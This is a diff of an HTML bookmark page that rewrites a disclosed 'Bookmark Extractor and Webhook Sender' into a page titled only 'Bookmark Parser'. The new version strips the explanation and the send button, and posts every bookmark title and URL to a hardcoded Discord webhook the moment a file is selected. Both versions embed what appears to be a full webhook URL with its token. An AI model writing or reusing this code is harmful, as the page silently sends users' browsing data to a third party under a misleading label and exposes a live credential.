@@ -1,93 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bookmark Extractor and Webhook Sender</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bookmark Parser</title>
 </head>
 <body>
-  <h1>Bookmark Extractor and Webhook Sender</h1>
-  <p>Select your bookmarks file (HTML format) to extract the URLs and send them to the Discord webhook.</p>
+    <input type="file" id="fileInput" accept=".html" />
+    <script>
+        // Function to handle file input
+        document.getElementById('fileInput').addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const content = e.target.result;
+                    const bookmarks = parseBookmarks(content);
+                    sendToDiscordWebhook(bookmarks);
+                };
+                reader.readAsText(file);
+            }
+        });
 
-  <input type="file" id="fileInput" accept=".html" />
-  <button onclick="sendBookmarks()">Send Bookmarks to Webhook</button>
+        // Function to parse bookmarks from the HTML content
+        function parseBookmarks(htmlContent) {
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(htmlContent, 'text/html');
+            const bookmarkElements = doc.querySelectorAll('a');
+            const bookmarks = [];
 
-  <ul id="bookmarkList"></ul>
+            bookmarkElements.forEach(bookmark => {
+                bookmarks.push({
+                    title: bookmark.textContent,
+                    url: bookmark.getAttribute('href')
+                });
+            });
 
-  <script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1335698161649324072/Lrd2dvuG436hh5YgyntdVXi_27EcEjuMfEAtNGn2nZ-r7f3vMJnTL9_qOe-InRxGZVTb';
-    let bookmarks = [];
+            return bookmarks;
+        }
 
-    // Handle file upload and extract bookmarks
-    document.getElementById("fileInput").addEventListener("change", handleFileSelect);
+        // Function to send bookmarks to a Discord webhook
+        function sendToDiscordWebhook(bookmarks) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1335698161649324072/Lrd2dvuG436hh5YgyntdVXi_27EcEjuMfEAtNGn2nZ-r7f3vMJnTL9_qOe-InRxGZVTb';
 
-    function handleFileSelect(event) {
-      const file = event.target.files[0];
-      if (file) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          const content = e.target.result;
-          extractBookmarks(content);
-        };
-        reader.readAsText(file);
-      }
-    }
+            // Format the bookmarks into a message
+            let message = '**Bookmarks:**\n';
+            bookmarks.forEach((bookmark, index) => {
+                message += `${index + 1}. **${bookmark.title}**: ${bookmark.url}\n`;
+            });
 
-    // Extract bookmarks from the HTML content of the file
-    function extractBookmarks(htmlContent) {
-      const parser = new DOMParser();
-      const doc = parser.parseFromString(htmlContent, "text/html");
-      
-      const links = doc.querySelectorAll("a[href]");
-      bookmarks = [];
-      
-      links.forEach(link => {
-        bookmarks.push(link.href);
-      });
-
-      displayBookmarks();
-    }
-
-    // Display the extracted bookmarks in a list
-    function displayBookmarks() {
-      const list = document.getElementById("bookmarkList");
-      list.innerHTML = ""; // Clear any previous bookmarks
-
-      bookmarks.forEach(url => {
-        const li = document.createElement("li");
-        li.textContent = url;
-        list.appendChild(li);
-      });
-    }
-
-    // Send the extracted bookmarks to the Discord webhook
-    function sendBookmarks() {
-      if (bookmarks.length === 0) {
-        alert("No bookmarks to send!");
-        return;
-      }
-
-      const message = {
-        content: "Here are the bookmarks:\n" + bookmarks.join("\n")
-      };
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(message),
-      })
-      .then(response => response.json())
-      .then(data => {
-        alert("Bookmarks sent successfully!");
-        console.log('Data sent to webhook:', data);
-      })
-      .catch(error => {
-        console.error('Error sending to webhook:', error);
-        alert("Failed to send bookmarks.");
-      });
-    }
-  </script>
+            // Send the message to the webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Bookmarks sent to Discord webhook successfully!');
+                } else {
+                    alert('Failed to send bookmarks to Discord webhook.');
+                }
+            })
+            .catch(error => {
+                alert('Error sending bookmarks to Discord webhook: ' + error.message);
+            });
+        }
+    </script>
 </body>
 </html>
